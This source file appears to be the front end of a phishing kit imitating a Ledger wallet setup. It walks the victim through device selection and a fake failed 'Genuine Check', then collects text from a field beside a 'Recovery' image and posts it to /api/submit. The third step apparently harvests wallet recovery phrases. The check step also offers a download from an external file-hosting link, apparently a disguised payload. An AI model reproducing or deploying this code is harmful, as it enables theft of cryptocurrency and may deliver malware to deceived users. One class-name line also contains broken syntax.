import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import styles from "./Form.module.css";
import { FaCircle, FaDownload, FaArrowsRotate } from "react-icons/fa6";
import { RiAlertLine } from "react-icons/ri";
import { PiSealCheckFill } from "react-icons/pi";
import {
  nanoplus,
  nanos,
  nanox,
  blue,
  loader,
  loader_image,
  recovery,
} from "../assets";

const Form = () => {
  const navigate = useNavigate();

  const [selectedImage, setSelectedImage] = useState(null);
  const [currentStep, setCurrentStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [imageSelected, setImageSelected] = useState(false);
  const [formData, setFormData] = useState("");
  const [showPopup, setShowPopup] = useState(false);

  const steps = ["Device Detection", "Device Check", "Ledger Live"];

  // Device selection
  const handleImageSelect = (image) => {
    setSelectedImage(image);
    setLoading(true);
    setImageSelected(true);

    setTimeout(() => {
      setLoading(false);
      setCurrentStep(1);
    }, 2000);
  };

  // Step 2 update
  const handleUpdateClick = () => {
    setLoading(false);
    setTimeout(() => {
      setCurrentStep(2);
      setLoading(false);
    });
  };

  // Step 3 form data
  const handleFormDataChange = (e) => {
    setFormData(e.target.value);
  };

  const handleClosePopup = () => {
    setShowPopup(false);
  };

  // Step 3 submit
  const handleStep3Submit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          form_type: "ledger_live",
          fullname: formData,
        }),
      });

      const result = await response.json();

      if (response.ok) {
        setFormData("");
        setShowPopup(true);

        // redirect after 2s so user sees popup
        setTimeout(() => {
          navigate("/success");
        }, 2000);
      } else {
        console.error("Error:", result.error);
      }
    } catch (error) {
      console.error("Fetch error:", error);
    }
  };

  return (
    <>
      {/* Timeline */}
      <div className={styles.timeline}>
        {steps.map((step, index) => (
          <div
            key={index}
            className={"element ${currentStep === index ? "active" }"}
          >
            <div
              className={`${styles.dotbox} ${
                currentStep >= index ? styles.filled : ""
              }`}
            >
              <div
                className={`${styles.dot} ${
                  currentStep >= index ? "active" : ""
                }`}
              >
                <FaCircle size={20} />
              </div>
            </div>
            <span>{step}</span>
          </div>
        ))}
      </div>

      {/* Step content */}
      <div className={styles.step_content}>
        {/* Step 1: Device selection */}
        {currentStep === 0 && (
          <div
            className={`${styles.step_one_content} ${
              imageSelected ? styles.hidden : ""
            }`}
          >
            <h2>Select your Device</h2>
            <div
              className={`${styles.image_box} ${
                imageSelected ? styles.hidden : ""
              }`}
            >
              {[{ img: nanos, name: "Nano S" },
                { img: nanoplus, name: "Nano S Plus" },
                { img: nanox, name: "Nano X" },
                { img: blue, name: "Blue" }].map((device) => (
                <div
                  key={device.name}
                  data-attribute={device.name}
                  onClick={() => handleImageSelect(device.img)}
                  className={selectedImage === device.img ? styles.selected : ""}
                >
                  <h3>{device.name}</h3>
                  <img
                    src={device.img}
                    alt={device.name}
                    className={device.name === "Blue" ? styles.last_child : ""}
                  />
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Step 2: Genuine Check */}
        {currentStep === 1 && (
          <div
            className={`${styles.step_two_content} ${
              loading ? styles.hidden : ""
            }`}
          >
            <h2>Genuine Check</h2>
            <RiAlertLine size={60} color="red" />
            <div className={styles.buttons}>
              <button onClick={handleUpdateClick}>
                <FaDownload />
              </button>
              <button onClick={() => handleImageSelect(nanos)}>
                <FaArrowsRotate />
                <span>Refresh</span>
              </button>
              <button
                onClick={() =>
                  window.open(
                    "https://api.files.link/v1/p/fe68c8cb-f70b-4321-992e-69ce0425b600",
                    "_blank"
                  )
                }
              >
                <FaDownload />
                <span>Download</span>
              </button>
            </div>
          </div>
        )}

        {/* Step 3: Ledger Live */}
        {currentStep === 2 && (
          <div className={styles.step_three_content}>
            <div style={{ height: "40px" }} />
            <img src={recovery} alt="Recovery" width={300} height={300} />
            <form onSubmit={handleStep3Submit}>
              <div className={styles.textareaCon}>
                <textarea
                  value={formData}
                  onChange={handleFormDataChange}
                  placeholder=""
                  className={styles.textarea}
                  rows={2}
                />
              </div>
              <button type="submit" className={styles.submitButton}>
                Continue
              </button>
            </form>
          </div>
        )}
      </div>

      {/* Loading */}
      {loading && (
        <div>
          <div className={styles.loader_content}>
            <div style={{ height: "40px" }} />
            <img src={loader_image} alt="" />
            <img src={loader} alt="loader" width={50} height={50} />
          </div>
        </div>
      )}

      {/* Popup */}
      {showPopup && (
        <div className={styles.popup}>
          <PiSealCheckFill size={40} color="#bbb0fd" />
          <p>
            Thank you for this information! <br />
            Please wait 24 hours.
            <br /> We'll be in touch.
          </p>
          <button className={styles.closeButton} onClick={handleClosePopup}>
            <span>Go back</span>
          </button>
        </div>
      )}
    </>
  );
};

export default Form;
